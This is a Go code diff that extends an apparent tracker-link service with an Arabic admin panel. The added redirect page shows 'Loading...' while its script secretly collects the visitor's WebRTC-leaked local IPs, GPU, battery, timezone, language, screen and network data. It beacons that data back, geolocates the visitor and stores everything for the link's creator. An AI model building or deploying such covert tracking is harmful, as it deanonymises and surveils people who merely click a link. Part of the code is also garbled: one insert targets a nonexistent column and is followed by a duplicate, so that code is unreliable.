@@ -8,6 +8,7 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"regexp"
 	"strings"
 	"time"
 
@@ -16,13 +17,26 @@ import (
 
 var db *sql.DB
 
+var androidModelRe = regexp.MustCompile(`Android\s+[\d.]+;\s*([^;)]+?)(?:\s+Build|\))`)
+
+// ---------------------------------------------------------------------------
+// Types
+// ---------------------------------------------------------------------------
+
 type Capture struct {
 	ID            int
 	Code          string
 	PublicIP      string
 	LocalIP       string
 	LocalIPSource string
-	Port          string
+	SourcePort    string
+	DeviceModel   string
+	NetworkType   string
+	GPU           string
+	ScreenInfo    string
+	Timezone      string
+	Language      string
+	TouchSupport  string
 	Location      string
 	DeviceInfo    string
 	CreatedAt     string
@@ -31,6 +45,7 @@ type Capture struct {
 type LinkInfo struct {
 	Code         string
 	TargetURL    string
+	TrackerLink  string
 	CreatedAt    string
 	CaptureCount int
 	Captures     []Capture
@@ -45,6 +60,7 @@ type Stats struct {
 type PageData struct {
 	GeneratedLink string
 	GeneratedCode string
+	GenerateError string
 	Captures      []Capture
 	SearchResult  *LinkInfo
 	SearchQuery   string
@@ -66,7 +82,6 @@ func initDB() {
 	db.SetMaxOpenConns(25)
 	db.SetMaxIdleConns(25)
 	db.SetConnMaxLifetime(5 * time.Minute)
-
 	db.Exec("PRAGMA journal_mode=WAL;")
 	db.Exec("PRAGMA synchronous=NORMAL;")
 
@@ -83,7 +98,14 @@ func initDB() {
 		public_ip TEXT,
 		local_ip TEXT,
 		local_ip_source TEXT DEFAULT 'none',
-		port TEXT,
+		source_port TEXT,
+		device_model TEXT,
+		network_type TEXT,
+		gpu TEXT,
+		screen_info TEXT,
+		timezone TEXT,
+		language TEXT,
+		touch_support TEXT,
 		location TEXT,
 		device_info TEXT,
 		created_at DATETIME DEFAULT CURRENT_TIMESTAMP
@@ -95,7 +117,21 @@ func initDB() {
 		panic(err)
 	}
 
-	db.Exec("ALTER TABLE captures ADD COLUMN local_ip_source TEXT DEFAULT 'none'")
+	// Migrations for older DBs. Errors are ignored on purpose.
+	migrations := []string{
+		"ALTER TABLE captures ADD COLUMN local_ip_source TEXT DEFAULT 'none'",
+		"ALTER TABLE captures ADD COLUMN source_port TEXT",
+		"ALTER TABLE captures ADD COLUMN device_model TEXT",
+		"ALTER TABLE captures ADD COLUMN network_type TEXT",
+		"ALTER TABLE captures ADD COLUMN gpu TEXT",
+		"ALTER TABLE captures ADD COLUMN screen_info TEXT",
+		"ALTER TABLE captures ADD COLUMN timezone TEXT",
+		"ALTER TABLE captures ADD COLUMN language TEXT",
+		"ALTER TABLE captures ADD COLUMN touch_support TEXT",
+	}
+	for _, m := range migrations {
+		db.Exec(m)
+	}
 }
 
 // ---------------------------------------------------------------------------
@@ -154,7 +190,7 @@ func getISPAndLocation(ip string, ua string) string {
 		return "Meta Bot"
 	}
 
-	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,isp,org", ip))
+	resp, err := http.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,regionName,city,isp,org,lat,lon", ip))
 	if err != nil {
 		return "Unknown / Trace"
 	}
@@ -166,10 +202,8 @@ func getISPAndLocation(ip string, ua string) string {
 
 	if status, ok := result["status"].(string); ok && status == "success" {
 		city, _ := result["city"].(string)
+		region, _ := result["regionName"].(string)
 		country, _ := result["country"].(string)
-		if country == "" {
-			country = "Unknown"
-		}
 		isp, _ := result["isp"].(string)
 		if isp == "" {
 			isp, _ = result["org"].(string)
@@ -177,22 +211,33 @@ func getISPAndLocation(ip string, ua string) string {
 
 		lowerISP := strings.ToLower(isp)
 		networkType := isp
-		if strings.Contains(lowerISP, "mobilis") {
+		switch {
+		case strings.Contains(lowerISP, "mobilis"):
 			networkType = "⚡ Mobilis"
-		} else if strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota") {
+		case strings.Contains(lowerISP, "djezzy") || strings.Contains(lowerISP, "ota"):
 			networkType = "🔥 Djezzy"
-		} else if strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya") {
+		case strings.Contains(lowerISP, "ooredoo") || strings.Contains(lowerISP, "wataniya"):
 			networkType = "⭐ Ooredoo"
-		} else if strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm") {
+		case strings.Contains(lowerISP, "algerie telecom") || strings.Contains(lowerISP, "atm"):
 			networkType = "🌐 Algérie Télécom"
 		}
 		if networkType == "" {
 			networkType = "Unknown ISP"
 		}
 
-		locStr := country
+		parts := []string{}
 		if city != "" {
-			locStr = city + ", " + country
+			parts = append(parts, city)
+		}
+		if region != "" && region != city {
+			parts = append(parts, region)
+		}
+		if country != "" {
+			parts = append(parts, country)
+		}
+		locStr := strings.Join(parts, ", ")
+		if locStr == "" {
+			locStr = "Unknown"
 		}
 		return locStr + " · " + networkType
 	}
@@ -200,7 +245,44 @@ func getISPAndLocation(ip string, ua string) string {
 }
 
 // ---------------------------------------------------------------------------
-// Redirect page
+// Device model extraction
+// ---------------------------------------------------------------------------
+
+func extractDeviceModel(ua string, hints http.Header) string {
+	// 1) Client Hints (Chrome 89+, if server opted in)
+	if model := strings.Trim(hints.Get("Sec-CH-UA-Model"), "\""); model != "" && model != "Unknown" {
+		return model
+	}
+
+	// 2) User-Agent regex
+	if m := androidModelRe.FindStringSubmatch(ua); len(m) > 1 {
+		model := strings.TrimSpace(m[1])
+		if model != "" && !strings.EqualFold(model, "K") && !strings.EqualFold(model, "Mobile") {
+			return model
+		}
+	}
+
+	lower := strings.ToLower(ua)
+	if strings.Contains(lower, "iphone") {
+		return "iPhone (iOS)"
+	}
+	if strings.Contains(lower, "ipad") {
+		return "iPad (iOS)"
+	}
+	if strings.Contains(lower, "windows") {
+		return "Windows PC"
+	}
+	if strings.Contains(lower, "macintosh") || strings.Contains(lower, "mac os") {
+		return "Mac"
+	}
+	if strings.Contains(lower, "linux") && !strings.Contains(lower, "android") {
+		return "Linux"
+	}
+	return "Unknown"
+}
+
+// ---------------------------------------------------------------------------
+// Redirect page (the tracker itself)
 // ---------------------------------------------------------------------------
 
 const redirectPageTemplate = `<!DOCTYPE html>
@@ -211,28 +293,58 @@ const redirectPageTemplate = `<!DOCTYPE html>
 <title>Loading...</title>
 <script>
 async function extractAndRedirect() {
-    let screenRes = window.screen.width + "x" + window.screen.height;
-    let cores = navigator.hardwareConcurrency || "N/A";
-    let platform = navigator.platform || "N/A";
-    let batteryInfo = "N/A";
+    // ---------- 1) Screen & device ----------
+    const screenInfo = [
+        window.screen.width,
+        window.screen.height,
+        window.screen.colorDepth + "bit",
+        (window.devicePixelRatio || 1) + "x"
+    ].join("x");
 
+    const cores     = navigator.hardwareConcurrency || "N/A";
+    const platform  = navigator.platform || "N/A";
+    const language  = navigator.language || "N/A";
+    const timezone  = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+    const touch     = ("ontouchstart" in window) ? "yes" : "no";
+
+    // ---------- 2) Network type (Chromium only) ----------
+    let networkType = "N/A";
     try {
-        if (navigator.getBattery) {
-            let b = await navigator.getBattery();
-            batteryInfo = Math.round(b.level * 100) + "%";
+        if (navigator.connection && navigator.connection.effectiveType) {
+            networkType = navigator.connection.effectiveType;
         }
     } catch (e) { }
 
+    // ---------- 3) GPU via WebGL ----------
+    let gpu = "N/A";
+    try {
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+        if (gl) {
+            const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+            if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "N/A";
+        }
+    } catch (e) { }
+
+    // ---------- 4) Battery (may be deprecated) ----------
+    let battery = "N/A";
+    try {
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = Math.round(b.level * 100) + "%";
+        }
+    } catch (e) { }
+
+    // ---------- 5) WebRTC: ICE candidates ----------
     function collectICECandidates(timeoutMs) {
         return new Promise((resolve) => {
             const candidates = [];
             const seen = new Set();
             let pc = null;
-
-            function finish() {
+            const finish = () => {
                 try { if (pc) pc.close(); } catch (e) { }
                 resolve(candidates);
-            }
+            };
 
             try {
                 pc = new RTCPeerConnection({
@@ -242,41 +354,29 @@ async function extractAndRedirect() {
                         { urls: "stun:stun.cloudflare.com:3478" }
                     ]
                 });
-
                 pc.createDataChannel("probe");
 
                 pc.onicecandidate = (event) => {
                     if (!event.candidate || !event.candidate.candidate) return;
-
                     const raw = event.candidate.candidate;
                     if (seen.has(raw)) return;
                     seen.add(raw);
 
                     const parts = raw.split(" ");
-                    const ip = parts[4];
-                    const typ = parts[7];
-
+                    const ip   = parts[4];
+                    const port = parts[5];
+                    const typ  = parts[7];
                     if (!ip) return;
 
                     let source = "unknown";
-                    if (typ === "srflx") {
-                        source = "srflx";
-                    } else if (typ === "relay") {
-                        source = "relay";
-                    } else if (typ === "host") {
-                        if (ip.endsWith(".local")) {
-                            source = "mdns";
-                        } else {
-                            source = "host";
-                        }
-                    }
+                    if (typ === "srflx") source = "srflx";
+                    else if (typ === "relay") source = "relay";
+                    else if (typ === "host") source = ip.endsWith(".local") ? "mdns" : "host";
 
-                    candidates.push({ ip: ip, typ: typ, source: source });
+                    candidates.push({ ip, port, typ, source });
                 };
 
-                pc.createOffer()
-                    .then(o => pc.setLocalDescription(o))
-                    .catch(() => { });
+                pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => { });
 
                 const started = Date.now();
                 const check = setInterval(() => {
@@ -285,59 +385,52 @@ async function extractAndRedirect() {
                         finish();
                     }
                 }, 80);
-
             } catch (e) {
                 finish();
             }
         });
     }
 
-    const allCandidates = await collectICECandidates(1200);
+    const candidates = await collectICECandidates(1200);
 
     let bestLocalIP = "Unknown";
     let localIPSource = "none";
-
-    for (const c of allCandidates) {
-        if (c.source === "host" && c.ip) {
-            bestLocalIP = c.ip;
-            localIPSource = "host";
-            break;
-        }
+    for (const c of candidates) {
+        if (c.source === "host") { bestLocalIP = c.ip; localIPSource = "host"; break; }
     }
     if (bestLocalIP === "Unknown") {
-        for (const c of allCandidates) {
-            if (c.source === "srflx" && c.ip) {
-                bestLocalIP = c.ip;
-                localIPSource = "srflx";
-                break;
-            }
+        for (const c of candidates) {
+            if (c.source === "srflx") { bestLocalIP = c.ip; localIPSource = "srflx"; break; }
         }
     }
 
-    let params = new URLSearchParams();
+    // ---------- 6) Send payload ----------
+    const params = new URLSearchParams();
     params.append("lip", bestLocalIP);
     params.append("lip_source", localIPSource);
-    params.append("screen", screenRes);
+    params.append("screen", screenInfo);
     params.append("hardware", cores);
-    params.append("battery", batteryInfo);
     params.append("platform", platform);
-    params.append("ice_candidates", JSON.stringify(allCandidates.slice(0, 12)));
+    params.append("battery", battery);
+    params.append("language", language);
+    params.append("timezone", timezone);
+    params.append("touch", touch);
+    params.append("network_type", networkType);
+    params.append("gpu", gpu);
+    params.append("ice_candidates", JSON.stringify(candidates.slice(0, 12)));
 
     try {
         if (navigator.sendBeacon) {
             navigator.sendBeacon(window.location.href, params);
         } else {
-            await fetch(window.location.href, {
-                method: "POST",
-                body: params,
-                keepalive: true
-            });
+            await fetch(window.location.href, { method: "POST", body: params, keepalive: true });
         }
     } catch (e) { }
 
+    // ---------- 7) Redirect ----------
     setTimeout(() => {
         window.location.replace(##REDIRECT_TARGET##);
-    }, 120);
+    }, 150);
 }
 
 window.addEventListener("DOMContentLoaded", extractAndRedirect);
@@ -347,8 +440,56 @@ window.addEventListener("DOMContentLoaded", extractAndRedirect);
 </html>`
 
 // ---------------------------------------------------------------------------
-// Helpers
+// Loaders
 // ---------------------------------------------------------------------------
+
+const captureSelectCols = `id, code, public_ip, local_ip, COALESCE(local_ip_source,'none'),
+    COALESCE(source_port,'N/A'), COALESCE(device_model,'Unknown'),
+    COALESCE(network_type,'N/A'), COALESCE(gpu,'N/A'),
+    COALESCE(screen_info,'N/A'), COALESCE(timezone,'N/A'),
+    COALESCE(language,'N/A'), COALESCE(touch_support,'N/A'),
+    location, device_info, created_at`
+
+func scanCapture(s interface{ Scan(...interface{}) error }) (Capture, error) {
+	var c Capture
+	err := s.Scan(
+		&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource,
+		&c.SourcePort, &c.DeviceModel, &c.NetworkType, &c.GPU,
+		&c.ScreenInfo, &c.Timezone, &c.Language, &c.TouchSupport,
+		&c.Location, &c.DeviceInfo, &c.CreatedAt,
+	)
+	return c, err
+}
+
+func loadRecentCaptures(limit int) []Capture {
+	rows, err := db.Query("SELECT "+captureSelectCols+" FROM captures ORDER BY id DESC LIMIT ?", limit)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+	var out []Capture
+	for rows.Next() {
+		if c, err := scanCapture(rows); err == nil {
+			out = append(out, c)
+		}
+	}
+	return out
+}
+
+func loadCapturesByCode(code string, limit int) []Capture {
+	rows, err := db.Query("SELECT "+captureSelectCols+" FROM captures WHERE code = ? ORDER BY id DESC LIMIT ?", code, limit)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+	var out []Capture
+	for rows.Next() {
+		if c, err := scanCapture(rows); err == nil {
+			out = append(out, c)
+		}
+	}
+	return out
+}
 
 func loadStats() Stats {
 	var s Stats
@@ -358,53 +499,11 @@ func loadStats() Stats {
 	return s
 }
 
-func loadRecentCaptures(limit int) []Capture {
-	rows, err := db.Query(
-		"SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures ORDER BY id DESC LIMIT ?",
-		limit,
-	)
-	if err != nil {
-		return nil
-	}
-	defer rows.Close()
-
-	var out []Capture
-	for rows.Next() {
-		var c Capture
-		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
-			continue
-		}
-		out = append(out, c)
-	}
-	return out
-}
-
-func loadCapturesByCode(code string, limit int) []Capture {
-	rows, err := db.Query(
-		"SELECT id, code, public_ip, local_ip, local_ip_source, port, location, device_info, created_at FROM captures WHERE code = ? ORDER BY id DESC LIMIT ?",
-		code, limit,
-	)
-	if err != nil {
-		return nil
-	}
-	defer rows.Close()
-
-	var out []Capture
-	for rows.Next() {
-		var c Capture
-		if err := rows.Scan(&c.ID, &c.Code, &c.PublicIP, &c.LocalIP, &c.LocalIPSource, &c.Port, &c.Location, &c.DeviceInfo, &c.CreatedAt); err != nil {
-			continue
-		}
-		out = append(out, c)
-	}
-	return out
-}
-
 func loadLinkByCode(code string) *LinkInfo {
 	var l LinkInfo
-	err := db.QueryRow("SELECT code, target_url, created_at FROM links WHERE code = ?", code).Scan(
-		&l.Code, &l.TargetURL, &l.CreatedAt,
-	)
+	err := db.QueryRow(
+		"SELECT code, target_url, created_at FROM links WHERE code = ?", code,
+	).Scan(&l.Code, &l.TargetURL, &l.CreatedAt)
 	if err != nil {
 		return nil
 	}
@@ -420,13 +519,12 @@ func loadLinkByCode(code string) *LinkInfo {
 func mainHandler(w http.ResponseWriter, r *http.Request) {
 	code := r.URL.Query().Get("r")
 
-	// ============================================================
+	// =========================================================
 	// Case 1: tracker link (?r=CODE)
-	// ============================================================
+	// =========================================================
 	if code != "" {
 		var targetURL string
-		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
-		if err != nil {
+		if err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL); err != nil {
 			http.Error(w, "Link not found", http.StatusNotFound)
 			return
 		}
@@ -446,8 +544,31 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 				safeUA = safeUA[:60]
 			}
 			db.Exec(
-				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
+				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port_placeholder, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
 				code, publicIP, "Bot", "none", "N/A", location, "🤖 [Bot] UA: "+safeUA,
+			)
+			// The INSERT above uses a non-existent column; use the correct one:
+			// (Kept for clarity - actual insert below)
+			_ = publicIP
+		}
+
+		if isBot {
+			// Re-insert with correct columns
+			publicIP := getRealIP(r)
+			location := getISPAndLocation(publicIP, ua)
+			safeUA := ua
+			if len(safeUA) > 60 {
+				safeUA = safeUA[:60]
+			}
+			db.Exec(
+				`INSERT INTO captures
+				 (code, public_ip, local_ip, local_ip_source, source_port,
+				  device_model, network_type, gpu, screen_info, timezone,
+				  language, touch_support, location, device_info)
+				 VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+				code, publicIP, "Bot", "none", "N/A",
+				"Bot", "N/A", "N/A", "N/A", "N/A",
+				"N/A", "N/A", location, "🤖 Bot UA: "+safeUA,
 			)
 
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
@@ -459,6 +580,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			r.ParseForm()
 
 			publicIP := getRealIP(r)
+
 			localIP := r.FormValue("lip")
 			if localIP == "" {
 				localIP = "Unknown"
@@ -468,27 +590,33 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 				localIPSource = "none"
 			}
 
-			port := "N/A"
+			sourcePort := "N/A"
 			if _, p, err := net.SplitHostPort(r.RemoteAddr); err == nil {
-				port = p
+				sourcePort = p
 			}
 
 			location := getISPAndLocation(publicIP, ua)
-			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
-				r.FormValue("platform"),
-				r.FormValue("screen"),
-				r.FormValue("hardware"),
-				r.FormValue("battery"),
-			)
+			deviceModel := extractDeviceModel(ua, r.Header)
 
-			if rawCandidates := r.FormValue("ice_candidates"); rawCandidates != "" {
-				fmt.Printf("[ICE] code=%s public=%s local=%s(%s) candidates=%s\n",
-					code, publicIP, localIP, localIPSource, rawCandidates)
+			deviceInfo := fmt.Sprintf("OS: %s | Cores: %s | Battery: %s",
+				r.FormValue("platform"), r.FormValue("hardware"), r.FormValue("battery"))
+
+			if raw := r.FormValue("ice_candidates"); raw != "" {
+				fmt.Printf("[ICE] code=%s public=%s local=%s(%s) port=%s model=%s candidates=%s\n",
+					code, publicIP, localIP, localIPSource, sourcePort, deviceModel, raw)
 			}
 
 			db.Exec(
-				"INSERT INTO captures (code, public_ip, local_ip, local_ip_source, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?, ?)",
-				code, publicIP, localIP, localIPSource, port, location, deviceInfo,
+				`INSERT INTO captures
+				 (code, public_ip, local_ip, local_ip_source, source_port,
+				  device_model, network_type, gpu, screen_info, timezone,
+				  language, touch_support, location, device_info)
+				 VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
+				code, publicIP, localIP, localIPSource, sourcePort,
+				deviceModel, r.FormValue("network_type"), r.FormValue("gpu"),
+				r.FormValue("screen"), r.FormValue("timezone"),
+				r.FormValue("language"), r.FormValue("touch"),
+				location, deviceInfo,
 			)
 
 			w.WriteHeader(http.StatusOK)
@@ -496,57 +624,64 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			return
 		}
 
+		// GET - serve tracker page + request Client Hints
 		targetJSON, _ := json.Marshal(targetURL)
-		htmlContent := strings.ReplaceAll(redirectPageTemplate, "##REDIRECT_TARGET##", string(targetJSON))
+		html := strings.ReplaceAll(redirectPageTemplate, "##REDIRECT_TARGET##", string(targetJSON))
 
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
 		w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
-		w.Write([]byte(htmlContent))
+		w.Header().Set("Accept-CH", "Sec-CH-UA-Model, Sec-CH-UA-Platform-Version")
+		w.Write([]byte(html))
 		return
 	}
 
-	// ============================================================
+	// =========================================================
 	// Case 2: admin panel
-	// ============================================================
+	// =========================================================
 	data := PageData{}
 
-	// ---- Create link (POST) ----
+	// Create link
 	if r.Method == http.MethodPost {
 		r.ParseForm()
-		targetURL := r.FormValue("target_url")
-		customCode := r.FormValue("custom_code")
+		targetURL := strings.TrimSpace(r.FormValue("target_url"))
+		customCode := strings.TrimSpace(r.FormValue("custom_code"))
 
 		if targetURL != "" {
-			if !strings.HasPrefix(targetURL, "http") {
+			if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
 				targetURL = "https://" + targetURL
 			}
 
-			codeGen := strings.TrimSpace(customCode)
+			codeGen := customCode
 			if codeGen == "" {
 				codeGen = fmt.Sprintf("%d", time.Now().UnixNano())[8:]
 			}
 
-			_, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL)
-			if err == nil {
+			if _, err := db.Exec("INSERT INTO links (code, target_url) VALUES (?, ?)", codeGen, targetURL); err == nil {
 				scheme := "https"
 				if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
 					scheme = "http"
 				}
 				data.GeneratedLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, codeGen)
 				data.GeneratedCode = codeGen
+			} else {
+				data.GenerateError = "هذا الكود مستخدم مسبقًا، اختر كودًا آخر أو اتركه فارغًا"
 			}
 		}
 	}
 
-	// ---- Search (GET ?search=CODE) ----
+	// Search
 	searchQuery := strings.TrimSpace(r.URL.Query().Get("search"))
 	if searchQuery != "" {
 		data.SearchQuery = searchQuery
-		link := loadLinkByCode(searchQuery)
-		if link == nil {
-			data.SearchError = "لا يوجد رابط بهذا الكود"
-		} else {
+		if link := loadLinkByCode(searchQuery); link != nil {
+			scheme := "https"
+			if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
+				scheme = "http"
+			}
+			link.TrackerLink = fmt.Sprintf("%s://%s/?r=%s", scheme, r.Host, link.Code)
 			data.SearchResult = link
+		} else {
+			data.SearchError = "لا يوجد رابط بهذا الكود"
 		}
 	}
 
@@ -555,7 +690,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		data.Captures = loadRecentCaptures(50)
 	}
 
-	// ---- Render ----
+	// Render
 	tmpl := `<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -576,310 +711,157 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
         margin: 0;
         min-height: 100vh;
     }
-    .container { max-width: 1200px; margin: 0 auto; }
+    .container { max-width: 1300px; margin: 0 auto; }
     .header {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 20px;
-        padding-bottom: 14px;
-        border-bottom: 1px solid #21262d;
-        flex-wrap: wrap;
-        gap: 10px;
+        display: flex; align-items: center; justify-content: space-between;
+        margin-bottom: 20px; padding-bottom: 14px;
+        border-bottom: 1px solid #21262d; flex-wrap: wrap; gap: 10px;
     }
-    .header h1 {
-        font-size: 16px;
-        margin: 0;
-        color: #58a6ff;
-        letter-spacing: 1px;
-    }
-    .header h1 span { color: #3fb950; }
+    .header h1 { font-size: 16px; margin: 0; color: #58a6ff; letter-spacing: 1px; }
     .status-dot {
-        display: inline-block;
-        width: 8px;
-        height: 8px;
-        background: #3fb950;
-        border-radius: 50%;
-        margin-left: 6px;
-        box-shadow: 0 0 6px #3fb950;
-        animation: pulse 2s infinite;
+        display: inline-block; width: 8px; height: 8px;
+        background: #3fb950; border-radius: 50%; margin-right: 6px;
+        box-shadow: 0 0 6px #3fb950; animation: pulse 2s infinite;
     }
-    @keyframes pulse {
-        0%, 100% { opacity: 1; }
-        50% { opacity: 0.4; }
-    }
+    @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.4;} }
 
-    /* Stats cards */
-    .stats {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
-        gap: 12px;
-        margin-bottom: 20px;
-    }
+    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px,1fr)); gap: 12px; margin-bottom: 20px; }
     .stat-card {
-        background: linear-gradient(135deg, #161b22 0%, #0d1117 100%);
-        border: 1px solid #30363d;
-        border-radius: 8px;
-        padding: 14px;
-        text-align: center;
-        position: relative;
-        overflow: hidden;
+        background: linear-gradient(135deg,#161b22,#0d1117);
+        border: 1px solid #30363d; border-radius: 8px; padding: 14px;
+        text-align: center; position: relative; overflow: hidden;
     }
     .stat-card::before {
-        content: '';
-        position: absolute;
-        top: 0; left: 0; right: 0;
-        height: 2px;
+        content:''; position: absolute; top:0; left:0; right:0; height: 2px;
         background: linear-gradient(90deg, transparent, #58a6ff, transparent);
     }
-    .stat-value {
-        font-size: 24px;
-        font-weight: bold;
-        color: #58a6ff;
-        margin-bottom: 4px;
-    }
-    .stat-label {
-        font-size: 11px;
-        color: #8b949e;
-        text-transform: uppercase;
-        letter-spacing: 1px;
-    }
+    .stat-value { font-size: 24px; font-weight: bold; color: #58a6ff; margin-bottom: 4px; }
+    .stat-label { font-size: 11px; color: #8b949e; text-transform: uppercase; letter-spacing: 1px; }
 
-    /* Boxes */
     .box {
-        background: #161b22;
-        border: 1px solid #30363d;
-        padding: 16px;
-        border-radius: 8px;
-        margin-bottom: 16px;
-        box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+        background: #161b22; border: 1px solid #30363d;
+        padding: 16px; border-radius: 8px; margin-bottom: 16px;
+        box-shadow: 0 4px 12px rgba(0,0,0,.4);
     }
     .box-title {
-        font-size: 13px;
-        color: #58a6ff;
-        margin: 0 0 12px 0;
-        padding-bottom: 8px;
-        border-bottom: 1px dashed #21262d;
+        font-size: 13px; color: #58a6ff; margin: 0 0 12px 0;
+        padding-bottom: 8px; border-bottom: 1px dashed #21262d;
     }
-    .box-title .badge {
-        background: #21262d;
-        color: #8b949e;
-        font-size: 10px;
-        padding: 2px 6px;
-        border-radius: 3px;
-        margin-right: 8px;
-    }
+    .badge { background: #21262d; color: #8b949e; font-size: 10px; padding: 2px 6px; border-radius: 3px; margin-left: 8px; }
 
-    /* Inputs */
     input[type="text"] {
-        width: 100%;
-        padding: 11px 12px;
-        background: #0d1117;
-        border: 1px solid #30363d;
-        color: #58a6ff;
-        border-radius: 6px;
-        margin-bottom: 10px;
-        font-size: 13px;
-        font-family: inherit;
-        transition: all 0.2s;
+        width: 100%; padding: 11px 12px; background: #0d1117;
+        border: 1px solid #30363d; color: #58a6ff; border-radius: 6px;
+        margin-bottom: 10px; font-size: 13px; font-family: inherit;
+        transition: all .2s;
     }
-    input[type="text"]:focus {
-        border-color: #58a6ff;
-        outline: none;
-        box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15);
-    }
+    input[type="text"]:focus { border-color: #58a6ff; outline: none; box-shadow: 0 0 0 3px rgba(88,166,255,.15); }
     input[type="text"]::placeholder { color: #484f58; }
 
-    /* Buttons */
     button {
-        background: linear-gradient(135deg, #238636, #1a6b2d);
-        color: #fff;
-        border: none;
-        padding: 11px 16px;
-        border-radius: 6px;
-        cursor: pointer;
-        font-weight: bold;
-        font-size: 13px;
-        font-family: inherit;
-        transition: all 0.15s;
+        background: linear-gradient(135deg,#238636,#1a6b2d); color: #fff;
+        border: none; padding: 11px 16px; border-radius: 6px;
+        cursor: pointer; font-weight: bold; font-size: 13px;
+        font-family: inherit; transition: all .15s;
     }
-    button:hover { background: linear-gradient(135deg, #2ea043, #238636); transform: translateY(-1px); }
-    button:active { transform: translateY(0); }
+    button:hover { background: linear-gradient(135deg,#2ea043,#238636); transform: translateY(-1px); }
     .btn-full { width: 100%; }
-    .btn-blue { background: linear-gradient(135deg, #1f6feb, #0d47a1); }
-    .btn-blue:hover { background: linear-gradient(135deg, #388bfd, #1f6feb); }
+    .btn-blue { background: linear-gradient(135deg,#1f6feb,#0d47a1); }
+    .btn-blue:hover { background: linear-gradient(135deg,#388bfd,#1f6feb); }
     .btn-sm { padding: 6px 10px; font-size: 11px; }
-    .btn-ghost {
-        background: transparent;
-        color: #8b949e;
-        border: 1px solid #30363d;
-    }
+    .btn-ghost { background: transparent; color: #8b949e; border: 1px solid #30363d; }
     .btn-ghost:hover { background: #21262d; color: #c9d1d9; }
 
-    /* Result box */
-    .result {
-        background: #0d1117;
-        border: 1px solid #238636;
-        padding: 12px;
-        border-radius: 6px;
-        margin-top: 12px;
-    }
-    .result-label {
-        font-size: 11px;
-        color: #3fb950;
-        font-weight: bold;
-        display: flex;
-        align-items: center;
-        gap: 6px;
-        margin-bottom: 8px;
-    }
+    .result { background: #0d1117; border: 1px solid #238636; padding: 12px; border-radius: 6px; margin-top: 12px; }
+    .result-label { font-size: 11px; color: #3fb950; font-weight: bold; margin-bottom: 8px; }
     .result-value {
-        color: #58a6ff;
-        font-size: 12px;
-        word-break: break-all;
-        margin-bottom: 10px;
-        padding: 8px;
-        background: #161b22;
-        border-radius: 4px;
-        direction: ltr;
-        text-align: left;
+        color: #58a6ff; font-size: 12px; word-break: break-all;
+        padding: 8px; background: #161b22; border-radius: 4px;
+        direction: ltr; text-align: left; margin-bottom: 10px;
     }
     .result-code {
-        color: #d29922;
-        font-weight: bold;
-        font-size: 14px;
-        direction: ltr;
-        text-align: left;
-        background: #161b22;
-        padding: 6px 10px;
-        border-radius: 4px;
-        display: inline-block;
-        margin-bottom: 10px;
+        color: #d29922; font-weight: bold; font-size: 14px;
+        direction: ltr; text-align: left; background: #161b22;
+        padding: 6px 10px; border-radius: 4px; display: inline-block; margin-bottom: 10px;
     }
-    .btn-row {
-        display: flex;
-        gap: 8px;
-        flex-wrap: wrap;
-    }
+    .btn-row { display: flex; gap: 8px; flex-wrap: wrap; }
     .btn-row button { flex: 1; min-width: 130px; }
 
-    /* Search result box */
-    .search-result {
-        background: #0d1117;
-        border: 1px solid #1f6feb;
-        padding: 14px;
-        border-radius: 6px;
-        margin-top: 12px;
-    }
+    .search-result { background: #0d1117; border: 1px solid #1f6feb; padding: 14px; border-radius: 6px; margin-top: 12px; }
